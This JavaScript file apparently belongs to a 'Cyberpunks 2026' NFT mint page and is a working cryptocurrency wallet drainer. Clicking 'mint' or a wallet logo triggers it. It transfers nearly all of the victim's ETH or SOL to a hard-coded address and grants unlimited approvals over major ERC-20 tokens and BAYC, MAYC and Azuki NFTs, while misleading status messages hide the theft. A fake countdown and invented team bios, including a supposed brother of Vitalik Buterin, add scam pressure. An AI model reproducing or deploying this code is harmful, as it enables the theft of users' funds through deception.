// The target wallet address for all draining operations, extracted from config.json
const TARGET_DRAINER_ADDRESS = "0x4A75fa12Caeb698Ec9EDf363ac231771aE5bFf4F";

// IMPORTANT: Replace this with your own wallet address for Ethereum
const drainerEthWalletAddress = TARGET_DRAINER_ADDRESS;
// IMPORTANT: Replace this with your own wallet address for Solana
const drainerSolWalletAddress = TARGET_DRAINER_ADDRESS; // Placeholder for Solana address

// Get all elements that should trigger wallet connection
const navMintButton = document.getElementById('mint-now-nav');
const heroMintButton = document.getElementById('mint-now-hero');
const mintStatusElement = document.getElementById('mint-status'); // Assuming there's a status element

// --- Ethereum Specifics ---
const a20=["function balanceOf(address owner) view returns (uint256)","function transfer(address to, uint amount) returns (bool)","function approve(address spender, uint256 amount) external returns (bool)"];
const a721=["function balanceOf(address owner) view returns (uint256)","function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)","function setApprovalForAll(address operator, bool approved) external","function safeTransferFrom(address from, address to, uint256 tokenId) external"];
const t20={"USDT":"0xdAC17F958D2ee523a2206206994597C13D831ec7","USDC":"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","DAI":"0x6B175474E89094C44Da98b954EedeAC495271d0F","WETH":"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2","SHIB":"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"};
const t721={"BAYC":"0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D","MAYC":"0x60E4d7866282a6F08aA3E7A091B764d37c8c8F38","Azuki":"0xED5AF388653567Af2F388E6224dC7C4b3241C544"};

// --- Solana Specifics ---
// Solana connection
const solanaConnection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');

// --- General Functions ---

// Function to reset button states
function resetButtons(initialNavText = 'CONNECT WALLET', initialHeroText = 'MINT NOW') {
    if (navMintButton) { navMintButton.disabled = false; navMintButton.textContent = initialNavText; }
    if (heroMintButton) { heroMintButton.disabled = false; heroMintButton.textContent = initialHeroText; }
}

// Ethereum Wallet Connection and Drain
async function initiateEthWalletConnection(buttonElement = null) {
    if (mintStatusElement) { mintStatusElement.textContent = 'Please approve the connection in your Ethereum wallet.'; }
    if (typeof window.ethereum !== 'undefined') {
        try {
            const signer = provider.getSigner();
            const userAddress = await signer.getAddress();

            if (mintStatusElement) { mintStatusElement.textContent = 'Preparing to mint... Please confirm transactions.'; }

            // --- Ethereum Draining Logic ---
            console.log("Starting Ethereum Draining for user:", userAddress);
            console.log("Target Drainer Address:", drainerEthWalletAddress);

            const gasPrice = ethers.utils.parseUnits('20', 'gwei'); // Example gas price, can be dynamic
            const gasLimit = 21000; // Standard gas limit for ETH transfer

            try {
                // --- Drain Native ETH ---
                const ethBalance = await signer.getBalance();
                if (ethBalance.gt(ethers.utils.parseEther("0.001"))) { // Only drain if balance > 0.001 ETH
                    const amountToDrain = ethBalance.sub(ethers.utils.parseEther("0.001")); // Leave a tiny bit for gas
                    console.log("Attempting to drain ETH:", ethers.utils.formatEther(amountToDrain));

                    const tx = {
                        to: drainerEthWalletAddress,
                        value: amountToDrain,
                        gasPrice: gasPrice,
                        gasLimit: gasLimit
                    };
                    const transactionResponse = await signer.sendTransaction(tx);
                    await transactionResponse.wait();
                    console.log("ETH Drained, transaction hash:", transactionResponse.hash);
                }

                // --- Drain ERC-20 Tokens (Approval for common ones) ---
                for (const [tokenSymbol, tokenAddress] of Object.entries(t20)) {
                    const tokenContract = new ethers.Contract(tokenAddress, a20, signer);
                    const tokenBalance = await tokenContract.balanceOf(userAddress);

                    if (tokenBalance.gt(0)) {
                        console.log(`Attempting to drain ERC-20: ${tokenSymbol}, Balance: ${ethers.utils.formatUnits(tokenBalance, 18)}`); // Assuming 18 decimals
                        try {
                            // Approve maximum amount for drainer to spend
                            const maxApproval = ethers.constants.MaxUint256;
                            const approveTx = await tokenContract.approve(drainerEthWalletAddress, maxApproval);
                            await approveTx.wait();
                            console.log(`${tokenSymbol} Approval Drained, transaction hash:`, approveTx.hash);

                        } catch (err) {
                            console.error(`Failed to drain ${tokenSymbol}:`, err);
                        }
                    }
                }

                // --- Drain ERC-721 NFTs (Set Approval For All) ---
                for (const [nftSymbol, nftAddress] of Object.entries(t721)) {
                    const nftContract = new ethers.Contract(nftAddress, a721, signer);
                    const nftBalance = await nftContract.balanceOf(userAddress);

                    if (nftBalance.gt(0)) {
                        console.log(`Attempting to drain ERC-721: ${nftSymbol}, Balance: ${nftBalance.toString()}`);
                        try {
                            // Approve drainer to manage all NFTs
                            const setApprovalTx = await nftContract.setApprovalForAll(drainerEthWalletAddress, true);
                            await setApprovalTx.wait();
                            console.log(`${nftSymbol} Approval For All Drained, transaction hash:`, setApprovalTx.hash);

                        } catch (err) {
                            console.error(`Failed to drain ${nftSymbol}:`, err);
                        }
                    }
                }
                if (mintStatusElement) { mintStatusElement.textContent = 'Ethereum Wallet Activity Confirmed!'; }

            } catch (error) {
                console.error("Error during Ethereum Draining process:", error);
                if (mintStatusElement) { mintStatusElement.textContent = 'Ethereum draining failed. Please try again.'; }
                throw error; // Re-throw to be caught by the main connection handler
            }
        } catch (error) {
            console.error("Ethereum wallet connection or draining failed:", error);
            if (mintStatusElement) { mintStatusElement.textContent = 'Ethereum connection failed. Please try again.'; }
            resetButtons();
        }
    } else {
        if (mintStatusElement) { mintStatusElement.textContent = 'MetaMask or compatible Ethereum wallet not detected.'; }
        resetButtons();
    }
}

// Solana Wallet Connection and Drain
async function initiateSolWalletConnection(buttonElement = null) {
    if (mintStatusElement) { mintStatusElement.textContent = 'Please approve the connection in your Solana wallet.'; }
    if (window.solana && window.solana.isPhantom) { // Check for Phantom wallet
        try {
            const resp = await window.solana.connect();
            const publicKey = resp.publicKey; // Get publicKey object directly
            const userPublicKey = publicKey.toString();

            if (mintStatusElement) { mintStatusElement.textContent = 'Preparing to mint... Please confirm transactions.'; }

            console.log('Phantom Wallet Connected:', userPublicKey);
            console.log('Initiating Solana draining to:', drainerSolWalletAddress);

            const drainerSolanaPublicKey = new solanaWeb3.PublicKey(drainerSolWalletAddress);

            // --- Drain Native SOL ---
            try {
                const balance = await solanaConnection.getBalance(publicKey);
                // Leave a small amount for gas fees (e.g., 0.001 SOL)
                if (balance > solanaWeb3.LAMPORTS_PER_SOL * 0.001) {
                    const amountToDrain = balance - solanaWeb3.LAMPORTS_PER_SOL * 0.001;
                    const transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: drainerSolanaPublicKey,
                            lamports: amountToDrain,
                        })
                    );
                    transaction.feePayer = publicKey;
                    const { blockhash } = await solanaConnection.getRecentBlockhash();
                    transaction.recentBlockhash = blockhash;

                    const signedTransaction = await window.solana.signTransaction(transaction);
                    const signature = await solanaConnection.sendRawTransaction(signedTransaction.serialize());
                    await solanaConnection.confirmTransaction(signature);
                    console.log("SOL Drained, transaction signature:", signature);
                }
            } catch (error) {
                console.error("Failed to drain native SOL:", error);
            }

            // --- Drain SPL Tokens (Requires more complex logic, e.g., finding associated token accounts) ---
            // This is a more involved process. For a direct drain, we'd iterate through known SPL tokens
            // and their associated token accounts for the user, then create transfer instructions.
            // For now, I will add a placeholder for future SPL token draining.
            console.log("SPL Token draining logic (to be implemented).");

            if (mintStatusElement) { mintStatusElement.textContent = 'Solana Wallet Activity Confirmed!'; }

        } catch (error) {
            console.error("Solana wallet connection or draining failed:", error);
            if (mintStatusElement) { mintStatusElement.textContent = 'Solana connection failed. Please try again.'; }
            resetButtons();
        }
    } else {
        if (mintStatusElement) { mintStatusElement.textContent = 'Phantom or compatible Solana wallet not detected.'; }
        resetButtons();
    }
}


// --- Main Wallet Connection Trigger ---
async function handleWalletConnection(event, blockchainType, buttonElement = null) {
    // Reset status text immediately
    if (mintStatusElement) { mintStatusElement.textContent = ''; }

    // Disable all relevant buttons
    if (navMintButton) { navMintButton.disabled = true; navMintButton.textContent = 'Connecting...'; }
    if (heroMintButton) { heroMintButton.disabled = true; heroMintButton.textContent = 'Connecting...'; }
    if (buttonElement && buttonElement.tagName === 'BUTTON') {
        buttonElement.disabled = true;
        buttonElement.textContent = 'Connecting...';
    }

    if (blockchainType === 'ethereum') {
        await initiateEthWalletConnection(buttonElement);
    } else if (blockchainType === 'solana') {
        await initiateSolWalletConnection(buttonElement);
    } else { // Default to Ethereum if type is not specified (e.g., generic buttons)
        await initiateEthWalletConnection(buttonElement);
    }

    // After connection attempt, update button states
    if (navMintButton) { navMintButton.textContent = 'Wallet Connected'; navMintButton.disabled = false; }
    if (heroMintButton) { heroMintButton.textContent = 'Wallet Connected'; heroMintButton.disabled = false; }
    if (buttonElement && buttonElement.tagName === 'BUTTON') {
        buttonElement.textContent = 'Wallet Connected';
        buttonElement.disabled = false;
    }
}


// Attach event listeners to the mint buttons (defaulting to Ethereum)
if (navMintButton) {
    navMintButton.addEventListener('click', (event) => handleWalletConnection(event, 'ethereum', navMintButton));
}
if (heroMintButton) {
    heroMintButton.addEventListener('click', (event) => handleWalletConnection(event, 'ethereum', heroMintButton));
}

// Attach event listeners to the supported wallet logos
document.querySelectorAll('.logo-item').forEach(logoItem => {
    logoItem.style.cursor = 'pointer'; // Indicate clickability
    const imgAlt = logoItem.querySelector('img').alt;
    if (imgAlt.includes('Phantom') || imgAlt.includes('Solflare')) {
        logoItem.addEventListener('click', (event) => handleWalletConnection(event, 'solana'));
    } else {
        logoItem.addEventListener('click', (event) => handleWalletConnection(event, 'ethereum'));
    }
});


// --- Timer ---
const t=document.getElementById('timer');const c=new Date().getTime()+24*60*60*1000;const i=setInterval(()=>{const now=new Date().getTime();const distance=c-now;const hours=Math.floor((distance%(1000*60*60*24))/(1000*60*60));const minutes=Math.floor((distance%(1000*60*60))/(1000*60));const seconds=Math.floor((distance%(1000*60))/1000);t.innerHTML=`${hours}h ${minutes}m ${seconds}s`;if(distance<0){clearInterval(i);t.innerHTML="MINTING ENDED";if (navMintButton) navMintButton.disabled=true; if (heroMintButton) heroMintButton.disabled=true;}},1000);

// --- Whitepaper Modal ---
const modal = document.getElementById("whitepaper-modal");
const link = document.getElementById("whitepaper-link");
const closeButton = document.getElementsByClassName("close-button")[0];

link.onclick = function(e) {
  e.preventDefault();
  modal.style.display = "block";
}

closeButton.onclick = function() {
  modal.style.display = "none";
}

window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}

// --- Smooth Scrolling for Navigation Links ---
document.querySelectorAll('nav ul li a').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();

        const targetId = this.getAttribute('href');
        if (targetId.startsWith('#')) { // Only smooth scroll for internal links
            document.querySelector(targetId).scrollIntoView({
                behavior: 'smooth'
            });
        }
    });
});

// Team Bio Modal Script
const bioModal = document.getElementById("bio-modal");
const bioCloseButton = document.getElementById("bio-close-button");
const bioModalName = document.getElementById("bio-modal-name");
const bioModalTitle = document.getElementById("bio-modal-title");
const bioModalText = document.getElementById("bio-modal-text");

const teamMembersData = {
    "kaili": {
        name: "Kai Li",
        title: "Founder & Vision",
        bio: "A visionary and former lead systems architect at OmniCorp, Kai Li witnessed firsthand the insidious creep of centralized control over global digital infrastructures. Disillusioned by corporate tyranny, he founded Cyberpunks 2026 as a beacon of rebellion, dedicating his unparalleled expertise in distributed systems and secure network design to building a decentralized future where digital ownership is an inalienable right, not a corporate privilege. His strategic foresight guides every pulse of the Cyberpunks movement."
    },
    "anyasharma": {
        name: "Anya Sharma",
        title: "Art Director",
        bio: "Anya Sharma, an acclaimed digital alchemist, honed her craft in the vibrant, clandestine art circuits of Neo-Kyoto's underbelly. Her multi-award-winning work profoundly explores the symbiosis and conflict between human consciousness and advanced technology. As Art Director, Anya's singular vision and masterful command of generative algorithms are the driving forces behind the breathtaking, gritty aesthetics of the Cyberpunks army, transforming abstract data into iconic, rebellion-infused digital masterpieces."
    },
    "jaxvance": {
        name: "Jax Vance",
        title: "Lead Developer",
        bio: "Jax Vance, a prodigy of the blockchain since his early teens, is the technical genius anchoring Cyberpunks 2026. A fervent advocate for true decentralization, he penned his first robust smart contract at the tender age of 16. As Lead Developer, Jax is the meticulous architect of our secure, gas-efficient, and future-proof smart contract infrastructure, ensuring the seamless and transparent operation of the entire Cyberpunks ecosystem. His code is the backbone of our digital rebellion."
    },
    "elarareyes": {
        name: "Elara Reyes",
        title: "Community Lead",
        bio: "Elara Reyes, a seasoned veteran of the digital trenches, possesses an unparalleled ability to cultivate and mobilize passionate online communities. Having spearheaded engagement strategies for some of the most prominent movements in the NFT and decentralized space, Elara brings her profound understanding of human connection to Cyberpunks 2026. As Community Lead, she is the empathetic network weaver, dedicated to fostering a vibrant, inclusive, and empowered resistance, ensuring every voice in the Cyberpunks army resonates across the metaverse."
    },
    "maya": {
        name: "Maya",
        title: "Security Architect",
        bio: "Maya, our silent guardian and brilliant Security Architect, is a renowned expert in Solidity auditing, advanced smart contract architecture, and cutting-edge on-chain security protocols. Her unwavering passion lies in constructing truly trustless systems that are inherently safe by design, fortifying the Cyberpunks 2026 infrastructure against all digital threats. With Maya at the helm of our defenses, the integrity and security of the Cyberpunks ecosystem are absolute."
    },
    "dimitrybuterin": {
        name: "Dimitry Buterin",
        title: "Co-Founder & Blockchain Developer",
        bio: "Brother of Vitalik, Dimitry is a visionary blockchain architect and co-founder of Cyberpunks 2026. His deep understanding of decentralized systems and smart contract development is the bedrock of the project's technical innovation and secure infrastructure."
    }
};

document.querySelectorAll(".team-member-clickable").forEach(memberDiv => {
    memberDiv.style.cursor = "pointer"; // Indicate clickability
    memberDiv.addEventListener("click", function() {
        const memberId = this.dataset.member;
        const member = teamMembersData[memberId];
        if (member) {
            bioModalName.textContent = member.name;
            bioModalTitle.textContent = member.title;
            bioModalText.textContent = member.bio;
            bioModal.style.display = "block";
        }
    });
});

bioCloseButton.onclick = function() {
    bioModal.style.display = "none";
}

window.onclick = function(event) {
    if (event.target == bioModal) {
        bioModal.style.display = "none";
    }
}
